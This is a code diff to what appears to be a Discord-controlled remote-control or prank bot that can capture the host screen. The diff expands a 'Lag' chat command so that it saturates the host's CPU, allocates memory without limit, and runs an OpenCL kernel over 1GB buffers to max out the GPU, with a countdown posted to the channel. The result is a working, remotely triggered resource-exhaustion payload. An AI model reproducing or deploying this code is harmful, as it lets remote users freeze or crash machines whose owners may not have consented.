@@ -20,6 +20,8 @@ from tkvideo import tkvideo
 from PIL import ImageGrab, Image, ImageTk
 import time
 import threading
+import pyopencl as cl
+import numpy as np
 
 # Load token from .env
 load_dotenv()
@@ -272,10 +274,35 @@ class MyClient(discord.Client):
                         seconds = int(seconds)
                         await message.channel.send(f'Lagging for {seconds} seconds...')
                         #lag the system by using up ram and cpu for the duration
-                        def lag_system(duration):
-                            
-
+                        async def lag_system(duration):
+                            await message.channel.send('Initialising GPU')
+                            # Select first platform and device automatically
+                            platforms = cl.get_platforms()
+                            platform = platforms[0]
+                            device = platform.get_devices()[0]
+                            ctx = cl.Context([device])
+                            queue = cl.CommandQueue(ctx)
+                        
+                            # Allocate ~1GB per buffer (256M floats * 4 bytes = 1GB)
+                            size = 256 * 1024 * 1024
+                            a_np = np.random.rand(size).astype(np.float32)
+                            b_np = np.random.rand(size).astype(np.float32)
+                        
+                            a_g = cl.Buffer(ctx, cl.mem_flags.READ_ONLY | cl.mem_flags.COPY_HOST_PTR, hostbuf=a_np)
+                            b_g = cl.Buffer(ctx, cl.mem_flags.READ_ONLY | cl.mem_flags.COPY_HOST_PTR, hostbuf=b_np)
+                            res_g = cl.Buffer(ctx, cl.mem_flags.WRITE_ONLY, a_np.nbytes)
+                        
+                            kernel_code = """
+                            __kernel void sum(__global const float *a, __global const float *b, __global float *res) {
+                                int gid = get_global_id(0);
+                                res[gid] = a[gid] + b[gid];
+                            }
+                            """
+                            prg = cl.Program(ctx, kernel_code).build()
+                            kernel = cl.Kernel(prg, "sum")
+                            await message.channel.send('Complete, Starting lag operation...')
                             def cpu_stress():
+                                
                                 end_time = time.time() + duration
                                 while time.time() < end_time:
                                     if self.cancelled:
@@ -284,23 +311,53 @@ class MyClient(discord.Client):
                                     pass
 
                             def memory_stress():
+                                
                                 a = []
                                 end_time = time.time() + duration
                                 while time.time() < end_time:
                                     a.append(' ' * 10**6)  # Allocate 1MB chunks
+                            
+                            def gpu_stress(duration=duration):
+                                
+                                end_time = time.time() + duration
+                                while time.time() < end_time:
+                                    # Run kernel multiple times per loop for more stress
+                                    for _ in range(8):
+                                        kernel.set_args(a_g, b_g, res_g)
+                                        cl.enqueue_nd_range_kernel(queue, kernel, (size,), None)
+                                    queue.finish()
 
                             cpu_thread = threading.Thread(target=cpu_stress)
                             memory_thread = threading.Thread(target=memory_stress)
-
+                            gpu_thread = threading.Thread(target=gpu_stress)
+                            await message.channel.send('Starting in')
+                            await asyncio.sleep(1)
+                            await message.channel.send('3')
+                            await asyncio.sleep(1)
+                            await message.channel.send('2')
+                            await asyncio.sleep(1)
+                            await message.channel.send('1')
+                            await asyncio.sleep(1)
                             cpu_thread.start()
+                            await message.channel.send('cpu thread started')
                             memory_thread.start()
-
+                            await message.channel.send('memory thread started')
+                            gpu_thread.start()
+                            await message.channel.send('gpu thread started')
+                            #send a message with countdown and edit it for the countodwn every second
+                            countdown_message = await message.channel.send(f'Complete in {duration}')
+                            for i in range(duration - 1, 0, -1):
+                                await asyncio.sleep(1)
+                                await countdown_message.edit(content=f'Complete in {i}')
+                            await asyncio.sleep(1)
+                            await countdown_message.edit(content='Lag complete!')
                             cpu_thread.join()
                             memory_thread.join()
-                            
-                        lag_system(seconds)
+                            gpu_thread.join()
+
+                        await lag_system(seconds)
                         
-                        await message.channel.send('Lag complete.')
+
                     except ValueError:
                         await message.channel.send('Invalid command format. Use "Lag <seconds>".')
 
